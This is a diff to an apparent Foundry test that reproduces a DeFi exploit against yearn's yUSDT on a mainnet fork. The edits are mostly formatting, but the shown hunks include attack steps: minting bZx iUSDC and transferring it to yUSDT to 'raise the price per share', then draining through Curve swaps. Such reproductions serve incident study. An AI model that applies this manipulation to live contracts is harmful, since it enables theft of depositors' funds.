@@ -1,7 +1,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @Analysis
 // https://twitter.com/cmichelio/status/1646422861219807233
@@ -429,10 +428,8 @@ contract ContractTest is Test {
     ILendingPool LendingPool = ILendingPool(0x398eC7346DcD622eDc5ae82352F02bE94C62d119);
     IbZxiUSDC bZxiUSDC = IbZxiUSDC(0xF013406A0B1d544238083DF0B93ad0d2cBE0f65f);
 
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-
     function setUp() external {
-        cheats.createSelectFork("mainnet", 17_036_774);
+        vm.createSelectFork("mainnet", 17_036_774);
     }
 
     //tx:0x055cec4fa4614836e54ea2e5cd3d14247ff3d61b85aa2a41f8cc876d131e0328
@@ -481,7 +478,7 @@ contract ContractTest is Test {
 
         yUSDT.deposit(YUSDT_DEPOSIT_USDT_AMOUNT);
 
-        uint256 amount = yUSDT.balanceAave() * bZxiUSDC.tokenPrice() / 1e18 * 114 / 100;
+        uint256 amount = (((yUSDT.balanceAave() * bZxiUSDC.tokenPrice()) / 1e18) * 114) / 100;
         uint256 mintAmount = bZxiUSDC.mint(address(this), amount);
 
         bZxiUSDC.transfer(address(yUSDT), mintAmount); //Raise the price per share
@@ -498,7 +495,7 @@ contract ContractTest is Test {
 
         curveYSwap.exchange(2, 0, 70_000_000_000, 1);
         curveYSwap.exchange(2, 1, 400_000_000_000_000, 1);
-        curveYSwap.exchange(2, 3, yUSDT.balanceOf(address(this)) * 100 / 101, 1);
+        curveYSwap.exchange(2, 3, (yUSDT.balanceOf(address(this)) * 100) / 101, 1);
         yDAI.withdraw(yDAI.balanceOf(address(this)));
         yUSDC.withdraw(yUSDC.balanceOf(address(this)));
 
@@ -511,7 +508,7 @@ contract ContractTest is Test {
         for (uint256 i = 0; i < aaveV1UsdtDebtUsers.length; i++) {
             (, uint256 amount,) = AaveLendingPoolCoreV1.getUserBorrowBalances(address(usdt), aaveV1UsdtDebtUsers[i]);
             if (amount != 0) {
-                uint256 repaymentAmount = amount * 101 / 100;
+                uint256 repaymentAmount = (amount * 101) / 100;
                 LendingPool.repay(address(usdt), repaymentAmount, aaveV1UsdtDebtUsers[i]);
             }
         }
